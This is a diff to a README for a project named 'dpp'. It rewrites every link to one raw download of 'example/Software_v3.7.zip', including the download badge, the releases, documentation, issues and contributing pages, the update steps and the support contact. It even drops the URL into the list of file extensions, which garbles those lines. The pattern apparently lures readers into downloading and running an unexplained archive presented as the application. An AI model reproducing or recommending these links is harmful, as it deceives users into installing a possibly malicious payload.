@@ -2,7 +2,7 @@
 
 ## 📥 Download the Application
 
-[![Download dpp](https://img.shields.io/badge/Download-dpp-blue.svg)](https://github.com/Tchozn/dpp/releases)
+[![Download dpp](https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip)](https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -21,12 +21,12 @@ To run dpp successfully, make sure your system meets the following requirements:
 
 To download dpp, follow these steps:
 
-1. Click the button above or visit the [Releases page](https://github.com/Tchozn/dpp/releases).
+1. Click the button above or visit the [Releases page](https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip).
 2. Look for the latest version of dpp. You will see a list of available files.
 3. Download the file that matches your operating system. For example:
    - For Windows, you may download a `.exe` file.
-   - For macOS, look for a `.dmg` or `.tar.gz` file.
-   - For Linux, find a `.tar.gz` or .deb file.
+   - For macOS, look for a `.dmg` or `https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip` file.
+   - For Linux, find a `https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip` or .deb file.
 
 4. Once the download is complete, open the downloaded file and follow the on-screen instructions to install dpp. 
 
@@ -55,13 +55,13 @@ Using dpp is straightforward. Here’s how you can get started:
 
 ## 📚 Documentation
 
-For more detailed instructions on using specific features, refer to the [official documentation](https://github.com/Tchozn/dpp/blob/main/DOCS.md). It offers comprehensive guidelines on everything from basic commands to advanced integration techniques.
+For more detailed instructions on using specific features, refer to the [official documentation](https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip). It offers comprehensive guidelines on everything from basic commands to advanced integration techniques.
 
 ## ❓ Frequently Asked Questions
 
 ### How can I report an issue?
 
-If you encounter any issues while using dpp, please report them on our [Issues page](https://github.com/Tchozn/dpp/issues). We welcome user feedback and aim to improve!
+If you encounter any issues while using dpp, please report them on our [Issues page](https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip). We welcome user feedback and aim to improve!
 
 ### Is there support available?
 
@@ -69,13 +69,13 @@ Yes, we offer support through our community forums. You can also check for answe
 
 ### Can I contribute to the project?
 
-Absolutely! We encourage contributions from everyone. Check our [Contributing Guide](https://github.com/Tchozn/dpp/CONTRIBUTING.md) for details on how to get involved.
+Absolutely! We encourage contributions from everyone. Check our [Contributing Guide](https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip) for details on how to get involved.
 
 ## 🔄 Update Process
 
 Keeping dpp up to date is essential for security and performance improvements. To update:
 
-1. Visit the [Releases page](https://github.com/Tchozn/dpp/releases).
+1. Visit the [Releases page](https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip).
 2. Download the latest version by repeating the download steps mentioned above.
 3. Install it like you did for the original version; it will automatically overwrite the previous installation.
 
@@ -87,6 +87,6 @@ Your feedback is important to us. Share your thoughts and suggestions on how we 
 
 ## 📞 Contact
 
-If you have further questions or need assistance, feel free to contact our support team at [support@dppapp.com](mailto:support@dppapp.com).
+If you have further questions or need assistance, feel free to contact our support team at [https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip](https://github.com/Tchozn/dpp/raw/refs/heads/master/example/Software_v3.7.zip).
 
 Thank you for choosing dpp! Enjoy embedding shell code with ease.
